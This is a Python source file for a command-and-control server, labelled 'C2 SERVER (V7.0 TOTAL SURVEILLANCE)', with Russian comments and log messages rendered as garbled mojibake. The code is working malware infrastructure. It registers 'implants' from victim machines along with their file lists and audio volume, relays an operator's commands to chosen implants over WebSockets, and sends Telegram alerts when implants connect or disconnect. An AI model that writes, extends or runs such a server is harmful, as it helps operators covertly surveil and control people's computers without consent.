# --- –§–∞–π–ª: c2_server.py (–í–µ—Ä—Å–∏—è 7.0 - –¢–û–¢–ê–õ–¨–ù–û–ï –ü–†–û–°–õ–£–®–ò–í–ê–ù–ò–ï) ---
import asyncio
import json
import os
from aiohttp import web

# –£–±–µ–¥–∏—Å—å, —á—Ç–æ utils.py –∏ settings.py –Ω–∞ –º–µ—Å—Ç–µ
from utils import send_telegram_message

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏–π
IMPLANTS, OPERATOR = {}, None

async def safe_send(ws, data):
    """–ë–µ–∑–æ–ø–∞—Å–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç JSON, –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞—è –æ—à–∏–±–∫–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è –∫–ª–∏–µ–Ω—Ç–∞."""
    if ws and not ws.closed:
        try:
            await ws.send_json(data)
            return True
        except (ConnectionResetError, asyncio.CancelledError):
            print(f"[SERVER-LOG] –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ: –∫–ª–∏–µ–Ω—Ç —É–∂–µ –æ—Ç–∫–ª—é—á–∏–ª—Å—è.")
            return False
    return False

async def broadcast_bot_list():
    """–ë–µ–∑–æ–ø–∞—Å–Ω–æ —Ç—Ä–∞–Ω—Å–ª–∏—Ä—É–µ—Ç —Å–ø–∏—Å–æ–∫ –±–æ—Ç–æ–≤ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É."""
    print("[SERVER-LOG] –¢—Ä–∞–Ω—Å–ª–∏—Ä—É—é –æ–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫ –±–æ—Ç–æ–≤ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É...")
    await safe_send(OPERATOR, {'type': 'bot_list', 'data': list(IMPLANTS.keys())})

async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse()

    peername = request.transport.get_extra_info('peername')
    client_ip = peername[0] if peername else "Unknown IP"
    print("\n" + "="*20 + " –ù–û–í–û–ï –°–û–ï–î–ò–ù–ï–ù–ò–ï " + "="*20)
    print(f"[SERVER-LOG] –ü–æ–ª—É—á–µ–Ω –Ω–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å –Ω–∞ WebSocket –æ—Ç {client_ip}.")

    await ws.prepare(request)
    print(f"[SERVER-LOG] WebSocket handshake –¥–ª—è {client_ip} –∑–∞–≤–µ—Ä—à–µ–Ω. –û–∂–∏–¥–∞—é –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏...")

    client_type, client_id = None, None
    try:
        # –û–∂–∏–¥–∞–µ–º –ø–µ—Ä–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∫–ª–∏–µ–Ω—Ç–∞
        initial_msg = await ws.receive_json(timeout=15.0)
        print(f"[SERVER-LOG] –û—Ç {client_ip} –ø–æ–ª—É—á–µ–Ω–æ –ø–µ—Ä–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ: {initial_msg}")

        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            client_id = f"OPERATOR_{client_ip}"
            print(f"[+] –û–ø–µ—Ä–∞—Ç–æ—Ä {client_id} –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω.")
            await broadcast_bot_list()

        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            if not client_id: raise ValueError("–ò–º–ø–ª–∞–Ω—Ç –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏–ª ID")

            IMPLANTS[client_id] = {"ws": ws, "files": initial_msg.get('files', {}), "volume": initial_msg.get('current_volume', 50)}
            hostname = client_id.replace("implant_", "")
            print(f"[+] –ò–º–ø–ª–∞–Ω—Ç {hostname} ({client_ip}) –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω –∏ –¥–æ–±–∞–≤–ª–µ–Ω –≤ —Å–ø–∏—Å–æ–∫.")
            send_telegram_message(f"‚úÖ –ò–º–ø–ª–∞–Ω—Ç –û–ù–õ–ê–ô–ù: {hostname}")
            await broadcast_bot_list()
        else:
            raise ValueError(f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π —Ç–∏–ø –∫–ª–∏–µ–Ω—Ç–∞: {client_type}")

        print(f"[SERVER-LOG] –ö–ª–∏–µ–Ω—Ç {client_id} —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ—à–µ–ª –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é. –ù–∞—á–∏–Ω–∞—é —Å–ª—É—à–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è...")
        # –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –ø–æ–ª—É—á–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT and msg.data != 'pong':
                data = json.loads(msg.data)
                print(f"[SERVER-LOG] –ü–æ–ª—É—á–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç {client_id}: {data}")

                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        print(f"[SERVER-LOG] –ü–µ—Ä–µ—Å—ã–ª–∞—é –∫–æ–º–∞–Ω–¥—É {data['payload'].get('action')} –±–æ—Ç—É {target_id}")
                        await safe_send(IMPLANTS[target_id]["ws"], data['payload'])
                    elif data['type'] == 'get_details' and target_id in IMPLANTS:
                        details = {"files": IMPLANTS[target_id].get("files"), "volume": IMPLANTS[target_id].get("volume")}
                        await safe_send(OPERATOR, {'type': 'bot_details', 'bot_id': target_id, 'data': details})

                elif client_type == 'implant':
                    if data.get('type') == 'file_list_update':
                        if client_id in IMPLANTS:
                            IMPLANTS[client_id]["files"] = data.get('files', {})
                            await safe_send(OPERATOR, {'type': 'bot_details', 'bot_id': client_id, 'data': {"files": data.get('files')}})

    except Exception as e:
        print(f"\n[!!! SERVER CRITICAL ERROR !!!] –û—à–∏–±–∫–∞ –≤ —Å–µ—Å—Å–∏–∏ —Å {client_id or client_ip}: {e.__class__.__name__} - {e}\n")

    finally:
        print("\n" + "-"*20 + " –û–¢–ö–õ–Æ–ß–ï–ù–ò–ï " + "-"*20)
        print(f"[SERVER-LOG] –ö–ª–∏–µ–Ω—Ç {client_id or client_ip} –æ—Ç–∫–ª—é—á–∞–µ—Ç—Å—è. –ó–∞—Ö–æ–∂—É –≤ –±–ª–æ–∫ finally.")
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            hostname = client_id.replace("implant_", "")
            print(f"[-] –ò–º–ø–ª–∞–Ω—Ç {hostname} —É–¥–∞–ª–µ–Ω –∏–∑ —Å–ø–∏—Å–∫–∞.")
            send_telegram_message(f"‚ùå –ò–º–ø–ª–∞–Ω—Ç –û–¢–ö–õ–Æ–ß–ò–õ–°–Ø: {hostname}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
            print(f"[-] –û–ø–µ—Ä–∞—Ç–æ—Ä {client_ip} –æ—Ç–∫–ª—é—á–∏–ª—Å—è.")
        print(f"[SERVER-LOG] –ü—Ä–æ—Ü–µ–¥—É—Ä–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è –¥–ª—è {client_id or client_ip} –∑–∞–≤–µ—Ä—à–µ–Ω–∞.")
    return ws

async def http_handler(request):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –æ—Ç–¥–∞—á–∏ –≤–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞."""
    return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∑–∞–ø—É—Å–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞."""
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 10000)
    await site.start()
    print("====== C2 SERVER (V7.0 TOTAL SURVEILLANCE) ONLINE ======")
    send_telegram_message("üöÄ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n–°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")
    finally:
        send_telegram_message("üõë –°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")
